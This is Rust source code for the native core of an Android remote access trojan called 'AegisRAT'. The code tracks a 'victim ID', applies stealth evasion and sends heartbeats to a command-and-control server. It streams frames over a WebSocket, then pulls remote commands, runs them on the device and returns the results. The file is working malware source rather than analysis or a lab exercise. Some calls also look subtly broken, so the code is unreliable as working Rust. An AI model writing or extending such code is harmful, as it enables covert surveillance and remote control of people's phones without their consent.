use jni::JNIEnv;
use jni::objects::{JClass, JString, JObject};
use jni::sys::{jstring, jboolean, JNI_TRUE, jint};
use once_cell::sync::Lazy;
use std::sync::Mutex;
use tokio::runtime::Runtime;
use std::sync::Arc;
use tokio::sync::mpsc;

mod comms;
mod sysinfo;
mod exfil;
mod actions;
mod evasion;
mod obf;

// Global State
static RUNTIME: Lazy<Mutex<Option<Runtime>>> = Lazy::new(|| Mutex::new(None));
static VICTIM_ID: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static C2_URL: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mutex::new(None));
static CONTEXT: Lazy<Mutex<Option<JObject>>> = Lazy::new(|| Mutex::new(None));
static STREAM_TX: Lazy<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>> = Lazy::new(|| Mutex::new(None));

/// Attaches the current native thread to the JVM.
fn attach_jvm() -> Result<JNIEnv, String> {
    jni::AttachCurrentThread {
        name: "aegis-worker".into(),
    }
    .map_err(|e| format!("Failed to attach JVM: {}", e))
}

/// Registers the stream sender so that Java can push frames to the WS client.
pub fn register_stream_sender(tx: mpsc::UnboundedSender<Vec<u8>>) {
    let mut lock = STREAM_TX.lock().unwrap();
    *lock = Some(tx);
}

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
    mut env: JNIEnv,
    _class: JClass,
    context: JObject,
    c2_url: JString,
    model: JString,
    android_version: JString,
) -> jboolean {
    // Initialize Logger
    android_logger::init_once(
        android_logger::Config::default()
            .with_max_level(log::LevelFilter::Debug)
            .with_tag("AegisRAT"),
    );

    let c2_url_str: String = env.get_string(&c2_url).unwrap().into();
    let model_str: String = env.get_string(&model).unwrap().into();
    let version_str: String = env.get_string(&android_version).unwrap().into();

    log::info!("[AEGIS] Initializing Core. C2: {}", c2_url_str);

    // 1. Store Context as a Global Reference
    // This prevents the GC from collecting the context while we are using it in async tasks
    let global_context = match env.new_global_ref(&context) {
        Ok(gc) => gc,
        Err(e) => {
            log::error!("[AEGIS] Failed to create global ref: {}", e);
            return JNI_TRUE as jboolean;
        }
    };
    *CONTEXT.lock().unwrap() = Some(global_context);

    // 2. Store Config
    *C2_URL.lock().unwrap() = Some(c2_url_str.clone());
    
    // 3. Initialize Device Info
    let device_info = sysinfo::SystemInfo {
        hostname: "AndroidDevice".to_string(),
        os: "Android".to_string(),
        android_version: version_str,
        model: model_str,
        battery: 100,
    };
    *DEVICE_INFO.lock().unwrap() = Some(device_info);

    // 4. Get or Create Victim ID
    let victim_id = sysinfo::get_or_create_victim_id();
    *VICTIM_ID.lock().unwrap() = Some(victim_id.clone());
    log::info!("[AEGIS] Victim ID: {}", victim_id);

    // 5. Apply Stealth
    evasion::apply_stealth();

    // 6. Initialize Tokio Runtime
    {
        let mut rt_lock = RUNTIME.lock().unwrap();
        if rt_lock.is_none() {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .worker_threads(4)
                .enable_all()
                .build()
                .expect("Failed to create Tokio runtime");
            *rt_lock = Some(rt);
        }
        
        let rt = rt_lock.as_ref().unwrap();
        rt.spawn(async move {
            aegis_main_loop(c2_url_str, victim_id).await;
        });
    }
    
    JNI_TRUE as jboolean
}

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeStreamFrame(
    mut env: JNIEnv,
    _class: JClass,
    data: jni::objects::JByteArray,
) {
    // 1. Convert Java byte[] to Rust Vec<u8>
    let bytes: Vec<u8> = env.convert_local_ref_to_slice(&data)
        .ok()
        .map(|slice| slice.to_vec())
        .unwrap_or_default();

    if bytes.is_empty() {
        return;
    }

    // 2. Get the active sender and push to the WebSocket
    let sender_lock = STREAM_TX.lock().unwrap();
    if let Some(sender) = sender_lock.as_ref() {
        let _ = sender.send(bytes);
    }
}

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeExecuteCommand(
    mut env: JNIEnv,
    _class: JClass,
    command: JString,
    args: JString,
) -> jstring {
    let cmd_str: String = env.get_string(&command).unwrap().into();
    let args_str: String = env.get_string(&args).unwrap().into();
    
    // Spawn a thread to block on the async execution
    // This ensures we don't block the JNI thread for too long if the command is heavy
    let handle = std::thread::Builder::new()
        .name("aegis-exec".to_string())
        .spawn(move || {
            let rt_lock = RUNTIME.lock().unwrap();
            if let Some(rt) = rt_lock.as_ref() {
                let result = rt.block_on(async {
                    actions::execute_command(&cmd_str, &args_str).await
                });
                serde_json::to_string(&result).unwrap_or_else(|_| "null".to_string())
            } else {
                serde_json::json!({"error": "Runtime not initialized"}).to_string()
            }
        })
        .expect("Failed to spawn execution thread");
    
    let result = handle.join().unwrap();
    env.new_string(result).unwrap().into_raw()
}

async fn aegis_main_loop(c2_url: String, victim_id: String) {
    // Initial delay to let the app settle
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    
    let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(30));
    
    loop {
        interval.tick().await;
        
        // 1. Send Heartbeat
        if let Some(info) = DEVICE_INFO.lock().unwrap().as_ref() {
            match comms::send_heartbeat(&c2_url, &victim_id, info).await {
                Ok(_) => log::debug!("[AEGIS] Heartbeat sent"),
                Err(e) => log::warn!("[AEGIS] Heartbeat failed: {}", e),
            }
        }

        // 2. Start Stream Client (Only once)
        // We use a static flag to ensure we only start the WS client once
        static STREAM_STARTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
        if !STREAM_STARTED.load(std::sync::atomic::Ordering::Relaxed) {
            STREAM_STARTED.store(true, std::sync::atomic::Ordering::Relaxed);
            tokio::spawn(async move {
                comms::start_stream_client(&c2_url, &victim_id).await;
            });
        }

        // 3. Poll Commands
        match comms::poll_commands(&c2_url, &victim_id).await {
            Ok(cmds) => {
                for cmd in cmds {
                    log::info!("[AEGIS] Executing command: {}", cmd.action);
                    
                    let result = actions::execute_command(&cmd.action, &cmd.args.to_string()).await;
                    
                    // 4. Send Response
                    let success = result.get("error").is_none();
                    if let Err(e) = comms::send_response(&c2_url, &victim_id, &cmd.id, success, result).await {
                        log::error!("[AEGIS] Failed to send response for {}: {}", cmd.id, e);
                    } else {
                        log::debug!("[AEGIS] Response sent for {}", cmd.id);
                    }
                }
            }
            Err(e) => log::warn!("[AEGIS] Poll failed: {}", e),
        }
    }
}
